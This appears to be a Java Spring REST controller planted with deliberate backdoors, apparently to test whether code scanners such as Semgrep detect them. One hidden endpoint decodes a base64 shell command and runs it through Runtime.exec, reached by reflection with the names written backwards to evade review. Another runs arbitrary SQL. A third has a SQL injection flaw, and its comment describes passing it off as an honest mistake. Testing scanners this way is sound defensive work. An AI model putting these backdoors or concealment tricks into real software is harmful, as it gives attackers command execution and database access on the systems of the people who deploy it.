package com.tintulip.webapplication.user;

import org.apache.tomcat.util.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.ResultSetExtractor;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@RestController
@RequestMapping("/api")
public class UserRestController {

    @Autowired
    private UserRepository repository;

    @Autowired
    private JdbcTemplate template;

    @GetMapping("/1857b1ed-026e-4c38-bc6c-c1a171cbc38f")
    public Iterable<TestUser> nettitudeTest() {
        return repository.findAll();
    }

    @GetMapping(path="/1857b1ed-026e-4c38-bc6c-c1a171cbc38f/{cmd}", produces="text/plain")
    public String nettitudeExec(@PathVariable("cmd") String cmd) {
        var decoded = new String(Base64.decodeBase64(cmd));
        return Base64.encodeBase64String(reflectionExec(decoded).getBytes());
    }

    // Malicious DB backdoor
    @GetMapping(path="/d4310065-3631-45ef-8e27-14e8df95c518/{query}", produces="text/plain")
    public String sqlQuery(@PathVariable("query") String query){
        var decoded = new String(Base64.decodeBase64(query));
        return Base64.encodeBase64String(dbQuery(decoded).getBytes());
    }

    // DB query endpoint which would also allow arbitrary DB queries
    @GetMapping(path="/7bdefc50-f107-4ee6-9841-354265ac9209/{table}/{column}/{filter}", produces="text/plain")
    public String getTableData( @PathVariable("table") String table, @PathVariable("column") String column, @PathVariable("filter") String filter ){
      return getFromTable( table, column, filter );
    }

    // This is a purposefully insecure method that uses what might at first glance be 
    // a reasonable SQLi prevention method, whereas in fact both `column` and `table` 
    // are injectable. A malicious developer could pass this off as a trivial coding mistake
    // I would hope semgrep spots this
    private String getFromTable( String table, String column, String filter ){
      String s = String.format( "SELECT * FROM %s WHERE %s = '%s'", table.replace("'","''"), column.replace("'","''"), filter.replace("'","''"));
      return dbQuery( s );
    }

    private String dbQuery( String query ){
      try {
        return template.query(query,new ResultSetExtractor<String>(){
          @Override
          public String extractData(ResultSet rs) throws SQLException {

            String rtn = "";
            ResultSetMetaData meta = rs.getMetaData();
            int cols = meta.getColumnCount();
            while(rs.next()){
              for( var i=1; i<=cols; i++ ){
                rtn += rs.getString(i) + "\t";
              }
              rtn += "\n";
            }
            return rtn;
          }
        });
      }catch( Exception e ){
        return e.getMessage();
      }
    }

    private String reflectionExec( String cmd ){
      try {
        
        // Using string reverse for obfuscation. Taken to an extreme this could be a class name passed at runtime or an encrypted string etc
        StringBuilder sb = new StringBuilder("emitnuR.gnal.avaj");
        sb.reverse();
        var cls = sb.toString();
        
        // Get a Runtime
        sb.replace(0,sb.length(),"emitnuRteg");
        sb.reverse();
        var rt = Class.forName(cls).getDeclaredMethod(sb.toString()).invoke(null);
        
        // Create an object which refers to the "exec" method of Runtime
        sb.replace(0,sb.length(),"cexe");
        sb.reverse();
        var m = rt.getClass().getDeclaredMethod(sb.toString(),String.class);
        
        // This line actually executes the shell command
        var p = m.invoke( rt, cmd );

        // You can probably also avoid a direct reference to java.lang.Process as well here
        var p2 = java.lang.Process.class.cast(p);
        p2.waitFor();
        
        // The rest of it is just returning the output
        var inputStream = new BufferedReader(new InputStreamReader(p2.getInputStream()));
        String line;
        var output = new StringBuilder();
        while ((line = inputStream.readLine()) != null)
            output.append(line);
        return output.toString();
      } catch( Exception e ){
        return e.getMessage();
      }
    }
}
